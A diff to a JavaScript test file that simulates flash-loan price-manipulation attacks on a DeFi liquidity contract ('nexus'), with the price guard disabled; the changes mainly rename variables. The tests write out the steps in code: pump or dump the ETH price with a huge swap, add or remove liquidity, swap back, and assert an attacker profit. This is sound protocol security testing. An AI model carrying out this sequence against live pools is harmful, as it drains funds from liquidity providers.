@@ -3,6 +3,7 @@ import {
   balanceUSDC,
   deadline,
   dumpPriceETH,
+  initializeAndDepositUSDC,
   nexus,
   pumpPriceETH,
   quote,
@@ -14,6 +15,7 @@ import { expect } from "chai";
 
 describe("flashloan exploit simulation", () => {
   beforeEach(async () => {
+    await initializeAndDepositUSDC();
     // we must disable price guard protection to demonstrate these exploits
     await nexus.methods.pausePriceGuard(true).send();
   });
@@ -27,19 +29,20 @@ describe("flashloan exploit simulation", () => {
     const startBalanceETH = await balanceETH(usdcWhale);
     const startBalanceUSDC = await balanceUSDC(usdcWhale);
 
-    const investUSDC = bn6("500,000,000");
+    const loanedUSDC = bn6("500,000,000");
 
-    const amountToReturnETH = await pumpPriceETH(investUSDC); // extreme pump ETH price by doing a huge swap
+    const amountToReturnETH = await pumpPriceETH(loanedUSDC); // extreme pump ETH price by doing a huge swap
 
     const available = bn(await nexus.methods.availableSpaceToDepositETH().call());
     await nexus.methods.addLiquidityETH(usdcWhale, deadline).send({ value: available, from: usdcWhale });
 
     await dumpPriceETH(amountToReturnETH); // bring ETH price back to normal by swapping back
 
-    await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });
+    // removing liquidity is not necessary for the attack to be profitable
+    // await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });
 
     console.log("exploit on entry results:");
-    console.log("total invested USDC", fmt6(investUSDC));
+    console.log("total loaned USDC", fmt6(loanedUSDC));
     const endDiffUSDC = (await balanceUSDC(usdcWhale)).sub(startBalanceUSDC);
     console.log("attacker diff USDC", fmt6(endDiffUSDC));
     expect(endDiffUSDC).bignumber.gt(zero); // attacker ended up with more USDC (the huge USDC loan was repaid)
@@ -50,7 +53,7 @@ describe("flashloan exploit simulation", () => {
     const lossETHinUSD = endDiffETH.abs().mul(startPrice).div(ether);
     console.log("attacker loss ETH in USD", fmt6(lossETHinUSD));
 
-    const fee = investUSDC.muln(1).divn(1000);
+    const fee = loanedUSDC.muln(1).divn(1000);
     console.log("estimated fee USDC", fmt6(fee));
 
     const profit = endDiffUSDC.sub(fee).sub(lossETHinUSD);
@@ -79,17 +82,17 @@ describe("flashloan exploit simulation", () => {
     const available = bn(await nexus.methods.availableSpaceToDepositETH().call());
     await nexus.methods.addLiquidityETH(usdcWhale, deadline).send({ value: available, from: usdcWhale });
 
-    const investETH = bn18("300,000");
-    const totalInvestETH = available.add(investETH);
+    const loanedETH = bn18("300,000");
+    const totalLoanedETH = available.add(loanedETH);
 
-    const amountToReturnUSDC = await dumpPriceETH(investETH); // extreme dump ETH price by doing a huge swap
+    const amountToReturnUSDC = await dumpPriceETH(loanedETH); // extreme dump ETH price by doing a huge swap
 
     await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });
 
     await pumpPriceETH(amountToReturnUSDC); // bring ETH price back to normal by swapping back
 
     console.log("exploit on exit results:");
-    console.log("total invested ETH", fmt18(totalInvestETH));
+    console.log("total loaned ETH", fmt18(totalLoanedETH));
     const endDiffUSDC = (await balanceUSDC(usdcWhale)).sub(startBalanceUSDC);
     console.log("attacker diff USDC", fmt6(endDiffUSDC));
     expect(endDiffUSDC).bignumber.zero; // attacker did not lose any USDC
@@ -97,7 +100,7 @@ describe("flashloan exploit simulation", () => {
     console.log("attacker diff ETH", fmt18(endDiffETH));
     expect(endDiffETH).bignumber.gt(zero); // attacker ended up with more ETH (the huge ETH loan was repaid)
 
-    const fee = totalInvestETH.muln(1).divn(1000);
+    const fee = totalLoanedETH.muln(1).divn(1000);
     console.log("estimated fee ETH", fmt18(fee));
 
     const profit = endDiffETH.sub(fee);
